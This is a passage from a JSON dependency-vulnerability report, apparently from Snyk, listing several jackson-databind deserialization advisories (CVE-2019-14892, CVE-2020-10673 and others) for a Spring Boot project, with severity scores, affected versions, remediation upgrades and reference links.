      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-03T08:13:33.357434Z",
      "credit": [
        "Pedro Sampaio"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)). \r\nIt doesn't block `common-configuration` JNDI classes `org.apache.commons.configuration.JNDIConfiguration` and `org.apache.commons.configuration2.JNDIConfiguration`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.8.11.5, 2.9.10.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/41b7f9b90149e9d44a65a8261a8deedc7186f6af)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2462)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2469)\n- [RedHat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14892)\n",
      "disclosureTime": "2020-03-02T17:09:34Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.3",
        "2.8.11.5",
        "2.9.10.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559106",
      "identifiers": {
        "CVE": [
          "CVE-2019-14892",
          "CVE-2019-14893"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cf6r-3wgc-h863",
          "GHSA-qmqc-x3r4-6v39"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:58:30.740224Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-02T17:09:34Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/41b7f9b90149e9d44a65a8261a8deedc7186f6af"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2462"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2469"
        },
        {
          "title": "RedHat Bugzilla",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14892"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.8.0,2.8.11.5)",
          "[2.9.0,2.9.10.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-19T14:36:02.644920Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `com.caucho.config.types.ResourceRef` (aka `caucho-quercus`).\r\n\r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit (Master)](https://github.com/FasterXML/jackson-databind/commit/1645efbd392989cf015f459a91c999e59c921b15)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2660)\n- [On Jackson CVE's Blog](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-10673)\n",
      "disclosureTime": "2020-03-18T22:56:21Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560762",
      "identifiers": {
        "CVE": [
          "CVE-2020-10673"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-fqwf-pjwf-7vqv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:40.081635Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-18T22:56:21Z",
      "references": [
        {
          "title": "GitHub Commit (Master)",
          "url": "https://github.com/FasterXML/jackson-databind/commit/1645efbd392989cf015f459a91c999e59c921b15"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2660"
        },
        {
          "title": "On Jackson CVE's Blog",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-10673"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-19T15:03:20.847507Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory` (aka `aries.transaction.jms`). \r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit (Master)](https://github.com/FasterXML/jackson-databind/commit/592872f4235c7f2a3280725278da55544032f72d)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2659)\n- [On Jackson CVEs: Don’t Panic](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-03-18T22:56:24Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560766",
      "identifiers": {
        "CVE": [
          "CVE-2020-10672"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-95cm-88f5-f2c7"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T15:39:04.662835Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-18T22:56:24Z",
      "references": [
        {
          "title": "GitHub Commit (Master)",
          "url": "https://github.com/FasterXML/jackson-databind/commit/592872f4235c7f2a3280725278da55544032f72d"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2659"
        },
        {
          "title": "On Jackson CVEs: Don’t Panic",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-26T16:25:31.113677Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to gadget `javax.swing.JEditorPane`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.7.9.7, 2.8.11.6, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2642)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-03-26T14:55:31Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.7.9.7",
        "2.8.11.6",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561362",
      "identifiers": {
        "CVE": [
          "CVE-2020-10969"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-758m-v56v-grj4"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T15:32:28.395275Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-26T14:55:31Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2642"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.7.9.7)",
          "[2.8.0,2.8.11.6)",
          "[2.9.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-26T17:09:01.709397Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to gadget `org.aoju.bus.proxy.provider.remoting.RmiProvider` (aka bus-proxy).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2662)\n",
      "disclosureTime": "2020-03-26T14:55:20Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561373",
      "identifiers": {
        "CVE": [
          "CVE-2020-10968"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-rf6r-2c4q-2vwg"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:39.848654Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-26T14:55:20Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2662"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-31T08:36:41.369827Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to gadget `org.apache.openjpa.ee.WASRegistryManagedRuntime` (aka openjpa).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/e2ba12d5d60715d95105e3e790fc234cfb59893d)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2670)\n- [PoC](https://github.com/Al1ex/CVE-2020-11113)\n",
      "disclosureTime": "2020-03-31T06:16:36Z",
